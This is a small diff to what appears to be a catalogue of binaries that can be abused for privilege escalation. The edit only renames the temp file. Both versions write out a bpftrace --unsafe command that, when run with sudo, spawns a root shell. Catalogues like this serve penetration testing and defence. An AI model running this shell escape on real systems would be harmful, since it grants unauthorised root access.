@@ -6,8 +6,8 @@ functions:
     contexts:
       sudo:
   - code: |-
-      echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >x
-      bpftrace --unsafe x
+      echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >/path/to/temp-file
+      bpftrace --unsafe /path/to/temp-file
     contexts:
       sudo:
   - code: |-
